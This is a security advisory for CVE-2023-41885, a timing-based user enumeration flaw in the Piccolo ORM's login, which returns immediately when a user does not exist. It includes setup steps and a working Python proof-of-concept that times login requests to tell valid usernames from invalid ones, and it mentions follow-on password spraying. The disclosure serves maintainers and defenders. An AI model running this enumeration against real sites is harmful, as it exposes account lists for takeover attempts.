# [M] Piccolo's current `BaseUser.login` implementation is vulnerable to time based user enumeration

## Summary
Severity: Medium
Advisory: GHSA-h7cm-mrvq-wcfr
CVE: CVE-2023-41885
CWE: CWE-203, CWE-204
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2023-09-12
Source: https://github.com/advisories/GHSA-h7cm-mrvq-wcfr
Type: github-advisory

## Affected
- PyPI: `piccolo` — affected >=0 <0.121.0

## Details
### Summary
_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._

The current implementation of `BaseUser.login` leaks enough information to a malicious user such that they would be able to successfully generate a list of valid users on the platform. As Piccolo on it's own does not also enforce strong passwords (see [here](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#implement-proper-password-strength-controls)), these lists of valid accounts are likely to be used in a password spray attack with the outcome being attempted takeover of user accounts on the platform.

The impact of this vulnerability is minor as it requires chaining with other attack vectors in order to gain more then simply a list of valid users on the underlying platform.
The likelihood of this vulnerability is possible as it requires minimal skills to pull off especially given the underlying login functionality for Piccolo based sites is open source.

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

This vulnerability relates to [this](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/apps/user/tables.py#L191-L237) code. Specifically the fact that responses are not returned in constant time, but rather are based off the internal state.

For example, if a user does not exist then `None` is returned immediately instead of encountering a time expensive hash comparison (Line 225). This discrepancy allows a malicious user to time requests made in order to generate a list of usernames which are valid on the underlying platform for usage in further attacks.

If your curious for some more information regarding this attack avenue, I wrote a blog post awhile back with a similar chain to this with some other types of analysis. It lives [here](https://skelmis.co.nz/posts/tbue/). 

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._
#### Piccolo Setup
1. In a fresh environment `pip install 'piccolo[all]'` and `piccolo asgi new`
2. For simplified testing purposes, in `piccolo_conf.py` modify Piccolo to use SQLite:
```python
from piccolo.engine.sqlite import SQLiteEngine
DB = SQLiteEngine()
```
3. In the same file, add the required apps for session authentication. The file should look like the following:
```python
from piccolo.engine.sqlite import SQLiteEngine
from piccolo.conf.apps import AppRegistry


DB = SQLiteEngine()

APP_REGISTRY = AppRegistry(
    apps=[
        "home.piccolo_app",
        "piccolo_admin.piccolo_app",
        "piccolo_api.session_auth.piccolo_app",
        "piccolo.apps.user.piccolo_app",
    ]
)
```
4. Run the following migrations:
```text
piccolo migrations forwards user
piccolo migrations forwards session_auth
```
5. Within `app.py`, mount `session_login` at the `/login` path as follows:
```python
from piccolo_api.session_auth.endpoints import session_login
app.mount("/login", session_login())
```
6. Create a new user using `piccolo user create`, making a note of the username and password for later steps.

#### Exploitation
The following Python script can be used to reproduce this issue. It could also be expanded to easily take in user lists to conduct user enumeration at scale, however, that is outside the scope of this report.

```python
import asyncio
import time
from collections import defaultdict

import httpx

number_of_attempts = 50
# Set this to the username from step 6.
valid_username = "skelmis"
invalid_username = "invalid"
data = defaultdict(lambda: [])
# Ensure this points to your current enviroment
local_base_url = "http://127.0.0.1:8000"
# Set this to the password from step 6.
valid_password = "disobey-blunt-kindly-postbox-tarantula"
invalid_password = "cabana-polar-secrecy-neurology-pacific"


async def make_request(username, password, session: httpx.AsyncClient):
    start_time = time.time()
    resp = await session.post(
        f"{local_base_url}/login",
        json={"username": username, "password": password},
        follow_redirects=True,
    )
    end_time = time.time()
    if username == valid_username and password == valid_password:
        # Just sanity check expected passes are passing
        assert resp.status_code == 200

    resultant_time = end_time - start_time
    data[f"{username}|{password}"].append(resultant_time)


async def main():
    async with httpx.AsyncClient() as client:
        # This is the baseline correct request
        for _ in range(number_of_attempts):
            await make_request(valid_username, valid_password, client)
            await asyncio.sleep(0.1)

        # This is for a valid user but invalid password
        for _ in range(number_of_attempts):
            await make_request(valid_username, invalid_password, client)
            await asyncio.sleep(0.1)

        # This is for an invalid user and password
        for _ in range(number_of_attempts):
            await make_request(invalid_username, invalid_password, client)
            await asyncio.sleep(0.1)

        r_1 = data[f"{valid_username}|{valid_password}"]
        r_2 = data[f"{valid_username}|{invalid_password}"]
        r_3 = data[f"{invalid_username}|{invalid_password}"]

        r_1_sum = sum(r_1) / len(r_1)
        r_2_sum = sum(r_2) / len(r_2)
        r_3_sum = sum(r_3) / len(r_3)

        print(
            f"Average time to response as a valid user with a valid password: {r_1_sum}"
        )
        print(
            f"Average time to response as a valid user with an invalid password: {r_2_sum}"
        )
        print(
            f"Average time to response as an invalid user with an invalid password: {r_3_sum}"
        )


if __name__ == "__main__":
    asyncio.run(main())
```

N.B. This script makes 50 requests per username/password combination in order to be more certain of the time to response for each combination


#### Analysis

The following is the output from the PoC against `pip install piccolo`
![Screenshot from 2023-09-08 18-36-45](https://user-images.githubusercontent.com/47520067/266522913-b8a0f499-e38b-47fd-a97d-292900320a01.png)

The following is the output from the PoC against `pip install git+https://github.com/piccolo-orm/piccolo.git`.
![Screenshot from 2023-09-08 17-51-16](https://user-images.githubusercontent.com/47520067/266514350-82384ce6-c24f-4b89-8516-ec08282053e1.png)

I have included the results from both versions to highlight that this issue is not as a result of [this](https://github.com/piccolo-orm/piccolo/pull/881) pull request but as a result of the underlying logic in usage.

Both of these runs clearly show a noticeable difference in the time to response for valid and invalid users which would allow a malicious user to build up a list of users for usage in further attacks against the website. For example, after building up a user list a malicious user may then conduct a [password spray attack](https://owasp.org/www-community/attacks/Password_Spraying_Attack) using common passwords in order to takeover user accounts on the platform.

### Impact
_What kind of vulnerability is it? Who is impacted?_

This is an information disclosure vulnerability. 
It would affect any Piccolo site, and all users of said Piccolo site who can login via regular login portals.

## References
- https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-h7cm-mrvq-wcfr
- https://nvd.nist.gov/vuln/detail/CVE-2023-41885
- https://github.com/piccolo-orm/piccolo/commit/edcfe3568382922ba3e3b65896e6e7272f972261
- https://github.com/piccolo-orm/piccolo
- https://github.com/pypa/advisory-database/tree/main/vulns/piccolo/PYSEC-2023-173.yaml
